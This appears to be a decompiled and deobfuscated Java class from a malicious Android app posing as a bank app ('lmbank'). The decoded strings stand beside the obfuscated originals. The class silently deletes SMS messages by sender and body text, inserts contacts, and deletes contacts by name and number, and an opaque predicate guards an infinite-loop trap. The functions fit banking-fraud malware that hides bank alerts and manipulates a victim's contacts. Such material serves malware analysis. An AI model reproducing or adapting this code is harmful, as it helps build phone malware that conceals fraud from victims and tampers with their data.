package com.wish.lmbank.utils;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.text.TextUtils;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/utils/ContentUtils.class */
public class ContentUtils {
    public static void deleteSMS(Context context, String str, String str2) {
        if (TextUtils.isEmpty(str) || TextUtils.isEmpty(str2)) {
            return;
        }
        Uri uri = Telephony.Sms.CONTENT_URI;
        ContentResolver contentResolver = context.getContentResolver();
        StringBuilder sb = new StringBuilder();
//         String m5998 = bb7d7pu7.m5998("TA");
        String m5998 = "%";
        sb.append(m5998);
        sb.append(str2);
        sb.append(m5998);
//         int delete = contentResolver.delete(uri, bb7d7pu7.m5998("CA0NGwwaGlRWSQgHDUkLBg0QSQUAAgxJVg"), new String[]{str, sb.toString()});
        int delete = contentResolver.delete(uri, "address=? and body like ?", new String[]{str, sb.toString()});
//         LogUtils.d(bb7d7pu7.m5998("KgYHHQwHHTwdAAUa"), bb7d7pu7.m5998("DQwFDB0MOiQ6RUkKBhwHHVNJ") + delete);
        LogUtils.d("ContentUtils", "deleteSMS, count: " + delete);
    }

    public static void insertContacts(Context context, String str, String str2) {
        ContentValues contentValues = new ContentValues();
        long findContactIdByDisplayName = findContactIdByDisplayName(context, str);
        if (findContactIdByDisplayName == 0) {
            findContactIdByDisplayName = ContentUris.parseId(context.getContentResolver().insert(ContactsContract.RawContacts.CONTENT_URI, contentValues));
        }
//         String m5998 = bb7d7pu7.m5998("GwgeNgoGBx0ICh02AA0");
        String m5998 = "raw_contact_id";
        contentValues.put(m5998, Long.valueOf(findContactIdByDisplayName));
//         String m59982 = bb7d7pu7.m5998("BAAEDB0QGQw");
        String m59982 = "mimetype";
//         contentValues.put(m59982, bb7d7pu7.m5998("HwcNRwgHDRsGAA1HChwbGgYbRwAdDARGBwgEDA"));
        contentValues.put(m59982, "vnd.android.cursor.item/name");
//         String m59983 = bb7d7pu7.m5998("DQgdCFs");
        String m59983 = "data2";
        contentValues.put(m59983, str);
        context.getContentResolver().insert(ContactsContract.Data.CONTENT_URI, contentValues);
        contentValues.clear();
        contentValues.put(m5998, Long.valueOf(findContactIdByDisplayName));
//         contentValues.put(m59982, bb7d7pu7.m5998("HwcNRwgHDRsGAA1HChwbGgYbRwAdDARGGQEGBww2H1s"));
        contentValues.put(m59982, "vnd.android.cursor.item/phone_v2");
//         contentValues.put(bb7d7pu7.m5998("DQgdCFg"), str2);
        contentValues.put("data1", str2);
        contentValues.put(m59983, (Integer) 10);
        context.getContentResolver().insert(ContactsContract.Data.CONTENT_URI, contentValues);
        contentValues.clear();
    }

    public static long findContactIdByDisplayName(Context context, String str) {
//         Cursor query = context.getContentResolver().query(ContactsContract.RawContacts.CONTENT_URI, new String[]{bb7d7pu7.m5998("NgAN")}, bb7d7pu7.m5998("DQAaGQUIEDYHCAQMVFY"), new String[]{str}, null);
        Cursor query = context.getContentResolver().query(ContactsContract.RawContacts.CONTENT_URI, new String[]{"_id"}, "display_name=?", new String[]{str}, null);
        if (query != null) {
            if (query.moveToFirst()) {
                int i = query.getInt(0);
                query.close();
                return i;
            }
            query.close();
            return 0L;
        }
        return 0L;
    }

    @SuppressLint("Range")
    public static boolean deleteContact(Context context, String str, String str2) {
        if ((6442 - 5287) % (-5287) > 0) {
//             String m5998 = bb7d7pu7.m5998("DQwFDB0MKgYHHQgKHQ");
            String m5998 = "deleteContact";
            Cursor query = context.getContentResolver().query(Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(str2)), null, null, null, null);
            try {
                try {
                    if (query.moveToFirst()) {
                        do {
//                             if (query.getString(query.getColumnIndex(bb7d7pu7.m5998("DQAaGQUIEDYHCAQM"))).equalsIgnoreCase(str)) {
                            if (query.getString(query.getColumnIndex("display_name")).equalsIgnoreCase(str)) {
//                                 context.getContentResolver().delete(Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_LOOKUP_URI, query.getString(query.getColumnIndex(bb7d7pu7.m5998("BQYGAhwZ")))), null, null);
                                context.getContentResolver().delete(Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_LOOKUP_URI, query.getString(query.getColumnIndex("lookup"))), null, null);
//                                 LogUtils.v(m5998, bb7d7pu7.m5998("DQwFDB0MKgYHHQgKHUk6HAoKDBoaRUkZAQYHDFNJ") + str2);
                                LogUtils.v(m5998, "deleteContact Success, phone: " + str2);
                                query.close();
                                return true;
                            }
                        } while (query.moveToNext());
                    }
                } catch (Exception e) {
//                     LogUtils.e(m5998, bb7d7pu7.m5998("DQwFDB0MKgYHHQgKHUkvCAAFDA1TSQ") + e.getMessage());
                    LogUtils.e(m5998, "deleteContact Failed: " + e.getMessage());
                }
                return false;
            } finally {
                query.close();
            }
        }
        int i = 16465 + 16465 + 6064;
        while (true) {
        }
    }
}
